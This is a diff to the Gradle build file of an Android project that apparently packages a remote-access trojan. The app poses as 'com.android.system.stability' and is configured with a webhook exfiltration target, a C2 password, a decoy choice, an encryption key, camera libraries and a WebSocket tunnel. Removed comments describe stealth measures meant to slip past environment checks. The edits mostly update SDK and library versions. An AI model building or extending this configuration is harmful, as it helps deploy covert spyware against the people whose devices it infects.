@@ -2,17 +2,15 @@ plugins {
     id 'com.android.application'
 }
 
-// Load keystore properties from file
 def keystorePropertiesFile = rootProject.file('keystore.properties')
 def keystoreProperties = new Properties()
-
 if (keystorePropertiesFile.exists()) {
     keystoreProperties.load(new FileInputStream(keystorePropertiesFile))
 }
 
 android {
     namespace 'com.labs.labrats'
-    compileSdk 34
+    compileSdk 37
 
     buildFeatures {
         buildConfig true
@@ -20,33 +18,25 @@ android {
 
     defaultConfig {
         applicationId "com.android.system.stability"
-        minSdk 21
-        targetSdk 34
+        minSdk 26
+        targetSdk 37
         versionCode 623
-<<<<<<< HEAD
-        versionName "4.1.7"
-=======
-        versionName "2.3.2"
->>>>>>> origin/K4N3CO.v1.6
-        multiDexEnabled true
-        
-        // Read WEBHOOK_URL from local.properties
+        versionName "1.7.0"
+        multiDexEnabled false
+
         def localProperties = new Properties()
         def localPropertiesFile = rootProject.file('local.properties')
         if (localPropertiesFile.exists()) {
             localProperties.load(new FileInputStream(localPropertiesFile))
         }
-        
+
         def webhookUrl = (localProperties['WEBHOOK_URL'] ?: "").trim().replace("\"", "").replace("'", "")
         def c2Password = (localProperties['C2_PASSWORD'] ?: "admin1337").toString().trim().replace("\"", "").replace("'", "")
         def decoyChoice = (localProperties['DECOY_CHOICE'] ?: "1").toString().trim()
         def encryptionKey = (localProperties['ENCRYPTION_KEY'] ?: "AndroidKernel1337").trim().replace("\"", "").replace("'", "")
 
         if (webhookUrl.isEmpty()) {
-            println "-------------------------------------------------------------------------"
             println "[BUILD WARNING] WEBHOOK_URL is EMPTY in local.properties!"
-            println "[BUILD WARNING] Run 'cd apk-builder && ./build.sh' to enter your Webhook URL."
-            println "-------------------------------------------------------------------------"
         } else {
             println "[BUILD SUCCESS] Webhook target configured: ${webhookUrl}"
         }
@@ -60,7 +50,6 @@ android {
     signingConfigs {
         release {
             if (keystorePropertiesFile.exists()) {
-                println "[BUILD] Keystore config detected: ${keystorePropertiesFile.absolutePath}"
                 storeFile rootProject.file(keystoreProperties['storeFile'] ?: 'lab-rats-keystore.jks')
                 storePassword keystoreProperties['storePassword'] ?: 'lab-rats123'
                 keyAlias keystoreProperties['keyAlias'] ?: 'lab-rats-key'
@@ -71,8 +60,6 @@ android {
 
     buildTypes {
         debug {
-            // [STEALTH_SYNC] Disabled debuggable flag to prevent system "Debugging App" warnings 
-            // and to allow the app to pass environment checks during local testing.
             debuggable false
             minifyEnabled false
             if (keystorePropertiesFile.exists() && signingConfigs.release.storeFile != null) {
@@ -81,6 +68,7 @@ android {
         }
         release {
             minifyEnabled true
+            shrinkResources true
             proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
             if (keystorePropertiesFile.exists() && signingConfigs.release.storeFile != null) {
                 signingConfig signingConfigs.release
@@ -89,8 +77,8 @@ android {
     }
 
     compileOptions {
-        sourceCompatibility JavaVersion.VERSION_1_8
-        targetCompatibility JavaVersion.VERSION_1_8
+        sourceCompatibility JavaVersion.VERSION_17
+        targetCompatibility JavaVersion.VERSION_17
     }
 
     lint {
@@ -99,12 +87,6 @@ android {
         abortOnError false
         checkAllWarnings false
         warningsAsErrors false
-    }
-
-    lintOptions {
-        checkReleaseBuilds false
-        checkDependencies false
-        abortOnError false
     }
 
     testOptions {
@@ -122,14 +104,14 @@ android {
 }
 
 dependencies {
-    implementation 'androidx.appcompat:appcompat:1.6.1'
-    implementation 'com.google.android.material:material:1.11.0'
-    implementation 'androidx.constraintlayout:constraintlayout:2.1.4'
+    implementation 'androidx.appcompat:appcompat:1.7.0'
+    implementation 'com.google.android.material:material:1.12.0'
+    implementation 'androidx.constraintlayout:constraintlayout:2.2.0'
     implementation 'org.nanohttpd:nanohttpd:2.3.1'
-    implementation "androidx.work:work-runtime:2.9.0"
+    implementation 'androidx.work:work-runtime:2.10.0'
+    implementation 'androidx.core:core:1.13.1'
 
-    // CameraX core library using the camera2 implementation
-    def camerax_version = "1.3.1"
+    def camerax_version = "1.5.0"
     implementation "androidx.camera:camera-core:${camerax_version}"
     implementation "androidx.camera:camera-camera2:${camerax_version}"
     implementation "androidx.camera:camera-lifecycle:${camerax_version}"
@@ -137,29 +119,22 @@ dependencies {
     implementation "androidx.camera:camera-view:${camerax_version}"
     implementation "androidx.camera:camera-extensions:${camerax_version}"
 
-    // [STABILITY_SYNC] WebSocket Tunnel Engine
     implementation 'com.squareup.okhttp3:okhttp:4.12.0'
 
-    // Testing Infrastructure
     testImplementation 'junit:junit:4.13.2'
     testImplementation 'org.mockito:mockito-core:5.11.0'
     testImplementation 'org.robolectric:robolectric:4.11.1'
     testImplementation 'androidx.test:core:1.5.0'
 }
 
-// Fix for "The processing instruction target matching '[xX][mM][lL]' is not allowed"
-// This ensures the XML declaration is always the first line in resource files.
 tasks.register("fixXmlDeclarations") {
     doLast {
-        fileTree("src/main/res").matching {
-            include "**/*.xml"
-        }.forEach { file ->
+        fileTree("src/main/res").matching { include "**/*.xml" }.forEach { file ->
             def content = file.getText("UTF-8")
             if (content.contains("<?xml")) {
                 def lines = content.readLines()
                 int xmlIndex = lines.findIndexOf { it.trim().startsWith("<?xml") }
                 if (xmlIndex > 0) {
-                    println "Fixing XML declaration in ${file.path}"
                     def xmlLine = lines.get(xmlIndex)
                     def remaining = new ArrayList(lines)
                     remaining.remove(xmlIndex)
@@ -172,8 +147,6 @@ tasks.register("fixXmlDeclarations") {
 
 project.afterEvaluate {
     if (tasks.findByName("preBuild")) {
-        tasks.named("preBuild").configure {
-            dependsOn("fixXmlDeclarations")
-        }
+        tasks.named("preBuild").configure { dependsOn("fixXmlDeclarations") }
     }
 }
